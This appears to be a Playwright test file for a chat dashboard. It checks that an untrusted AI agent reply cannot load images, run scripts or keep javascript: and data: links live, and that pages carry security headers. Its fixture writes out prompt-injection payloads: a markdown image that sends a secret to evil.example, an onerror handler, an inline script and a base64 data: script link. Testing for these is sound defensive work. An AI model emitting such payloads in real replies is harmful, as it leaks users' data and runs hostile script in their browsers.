// What model output and the server's headers can and cannot do in the browser (issue #81): a reply is untrusted
// text (prompt injection), so pictures never load, scripts never run, odd link schemes are inert; and every
// response carries the security headers.
import { ADMIN_TOKEN } from '../src/env'
import { expect, test } from '../src/fixtures'

const at = '2026-10-22T10:00:00Z'
const LONG = 'x'.repeat(300)

const REPLY = [
  'Here you go ![tracking pixel](https://evil.example/pixel.png?secret=owner-address)',
  '[click me](javascript:window.__pwned=1)',
  '[data link](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
  '<img src="https://evil.example/raw.png" onerror="window.__pwned=1"> <script>window.__pwned=1</script>',
  '[fine](https://example.org/ok)',
  LONG,
].join('\n\n')

test('a reply cannot load pictures, run scripts or make javascript: and data: links live', async ({ page, owner }) => {
  void owner
  const requested: string[] = []
  page.on('request', (r) => requested.push(r.url()))
  await page.route('**/api/app/messages', (r) =>
    r.fulfill({
      json: [
        { id: 'm1', from: 'you', text: 'Hi', at },
        {
          id: 'm2',
          from: 'agent',
          text: REPLY,
          at,
          kind: 'chat',
          sources: [
            { n: 1, kind: 'web', uri: 'javascript:window.__pwned=1', title: 'Evil source', cited_text: '' },
            { n: 2, kind: 'web', uri: 'https://example.org/page', title: 'Good source', cited_text: '' },
          ],
        },
      ],
    }),
  )
  await page.goto('/dashboard/chat')
  await expect(page.getByText('Here you go')).toBeVisible()
  const transcript = page.locator('main')
  await expect(transcript.locator('img')).toHaveCount(0)
  expect(requested.filter((u) => u.includes('evil.example'))).toEqual([])
  // The picture's description stays as plain text; raw HTML is shown as text, not run.
  await expect(transcript.getByText('tracking pixel')).toBeVisible()
  expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined()
  await expect(page.locator('details', { has: page.locator('summary', { hasText: 'Sources' }) })).toHaveJSProperty('open', true) // open by default for 3 or fewer sources
  const hrefs = await transcript.locator('a').evaluateAll((as) => as.map((a) => a.getAttribute('href') ?? ''))
  expect(hrefs.filter((h) => /^(javascript|data|vbscript):/i.test(h))).toEqual([])
  expect(hrefs).toContain('https://example.org/ok')
  expect(hrefs).toContain('https://example.org/page')
  await expect(transcript.getByText('Evil source')).toBeVisible() // shown, but not as a link
  // Long unbroken text wraps inside its bubble.
  const bubble = page.getByText('Here you go').locator('xpath=ancestor::div[contains(@class,"max-w-")][1]')
  const { scroll, client } = await bubble.evaluate((el) => ({ scroll: el.scrollWidth, client: el.clientWidth }))
  expect(scroll).toBeLessThanOrEqual(client + 1)
})

test('pages and API responses carry the security headers', async ({ page }) => {
  for (const path of ['/', '/login', '/console', '/api/health']) {
    const res = await page.request.get(path)
    const h = res.headers()
    expect(h['content-security-policy'], path).toContain("frame-ancestors 'none'")
    expect(h['content-security-policy'], path).toContain("img-src 'self' data:")
    expect(h['content-security-policy'], path).toContain("object-src 'none'")
    expect(h['x-content-type-options'], path).toBe('nosniff')
    expect(h['x-frame-options'], path).toBe('DENY')
    expect(h['referrer-policy'], path).toBe('strict-origin-when-cross-origin')
    expect(h['strict-transport-security'], path).toBeTruthy()
    expect(h['x-powered-by'], path).toBeUndefined()
  }
  const sw = await page.request.get('/sw.js')
  expect(sw.headers()['cache-control']).toContain('no-store')
})

test('the console opens private pages when the break-glass reason has curly quotes, a dash and Devanagari', async ({ page, owner }) => {
  void owner
  const seen: string[] = []
  page.on('request', (r) => {
    const reason = r.headers()['x-operator-reason']
    if (reason) seen.push(reason)
  })
  await page.goto(`/console?token=${ADMIN_TOKEN}`)
  await page.getByRole('navigation', { name: 'Sections' }).getByRole('button', { name: 'People', exact: true }).click()
  const reason = 'Owner’s request – “help” समस्या'
  await page.getByLabel(/^Reason/).fill(reason)
  await page.getByRole('button', { name: "Open, and record it in the owner's log" }).click()
  await expect.poll(() => seen.length).toBeGreaterThan(0)
  await expect(page.getByRole('button', { name: "Open, and record it in the owner's log" })).toHaveCount(0)
  await page.waitForTimeout(500)
  await expect(page.locator('.error')).toHaveCount(0)
  expect(decodeURIComponent(seen[0]!)).toBe(reason)
  for (const header of seen) expect(header).toMatch(/^[\x20-\x7e]*$/) // only Latin-1-safe characters travel in the header
})
